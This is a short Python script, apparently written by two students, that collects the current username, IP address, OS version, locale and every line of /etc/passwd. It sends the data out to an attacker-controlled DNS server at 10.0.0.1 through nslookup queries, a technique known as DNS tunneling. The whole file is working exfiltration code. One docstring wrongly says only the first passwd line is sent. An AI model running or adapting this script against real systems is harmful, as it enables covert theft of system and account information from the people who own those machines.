# Aliza Lazar – 336392899
# Raz Cohen – 208008995

import os
import platform
import subprocess

#IP address of the attacker's DNS server(assumes DNS server is listening here)
ATTACKER_DNS_IP = "10.0.0.1"

#Custom DNS zone configured on the attacker's BIND9 server
#Used to construct domain names that encode stolen data
DNS_ZONE = "x"

#Information Collection
def get_username():
    """
    Attempts to get the current logged-in username.
    First tries environment variable 'USER' (Linux/Mac),
    falls back to `whoami` command for broader OS support.
    On Windows, USER may also work, or 'USERNAME'.
    """
    return os.getenv("USER") or subprocess.getoutput("whoami")

def get_ip():
    """
    Gets the system's local IP address.
    Uses 'hostname -I' (Linux only).
    Note: This won't work correctly on Windows as-is.
    """
    return subprocess.getoutput("hostname -I").strip().split()[0]

def get_os_version():
    """
    Returns a human-readable string describing the OS version.
    Uses Python's cross-platform 'platform' module.
    """
    return platform.platform()

def get_languages():
    """
    Attempts to get the system's default language/locale.
    Uses 'LANG' environment variable (common on Linux).
    On Windows, this may not be available.
    """
    return os.getenv("LANG", "unknown")

def read_password_file():
    """
    Attempts to read the contents of /etc/passwd (Linux only).
    This file lists user accounts and is readable by all users on Linux.
    On Windows, this file does not exist — function will return error.
    """
    try:
        with open("/etc/passwd", "r") as f:
            return f.read()
    except Exception as e:
        # Catch file errors and return a descriptive error string
        return f"error_reading_passwd:{e}"

#DNS Exfiltration Mechanism
def send_via_dns(label):
    """
    Sends a chunk of data via DNS query to the attacker's server.
    - Replaces forbidden/suspicious characters
    - Builds a domain name like: sanitized.10.0.0.1.x
    - Uses nslookup to send the request
    NOTE:
      - Assumes 'nslookup' is installed and in PATH
      - Works on both Linux and Windows if nslookup is available
    """
    #Clean the data to fit in a valid DNS label (max 63 chars, here trimmed to 50)
    sanitized = label.replace(" ", "_").replace("/", "_").replace(":", "_")[:50]

    #Construct domain to resolve (e.g., user-root.10.0.0.1.x)
    full_domain = f"{sanitized}.{ATTACKER_DNS_IP}.{DNS_ZONE}"

    #Construct the system command to send DNS request to attacker's server
    cmd = f"nslookup {full_domain} {ATTACKER_DNS_IP}"

    # Execute the command(just sends request)
    os.system(cmd)

def exfiltrate_passwd():
    try:
        with open("/etc/passwd", "r") as f:
            for i, line in enumerate(f):
                sanitized = line.strip().replace(":", "_").replace("/", "_").replace(" ", "_")
                label = f"pw{i}-{sanitized}"[:63] # Cuts to fit DNS label length (max 63 chars)
                send_via_dns(label)
    except Exception as e:
        send_via_dns(f"pw-error-{str(e).replace(' ', '_')[:50]}")

#Main Data Collection Routine
def exfiltrate():
    """
    Collects sensitive system information and sends it to the attacker
    using DNS tunneling via multiple nslookup queries.
    Only sends the first line of the password file (or error message).
    """

    print("[*] Collecting system info...")

    #Gather data into a dictionary
    data = {
        "user": get_username(), # Current user
        "ip": get_ip(), # System IP (Linux only)
        "os": get_os_version(), # OS platform string
        "lang": get_languages(), # Language settings
    }

    print("[*] Sending data via DNS...")

    #For each piece of information,send a DNS query containing it
    for key, val in data.items():
        dns_label = f"{key}-{val}" # e.g., "user-root"
        send_via_dns(dns_label) # Send as part of DNS request

    exfiltrate_passwd()

    #Print collected data to terminal
    print("\n[*] Collected Information:")
    for key, val in data.items():
        print(f"{key}: {val}")
    print("password file: [extracted via DNS]")

    print("[*] Exfiltration complete.")


if __name__ == "__main__":
    exfiltrate()
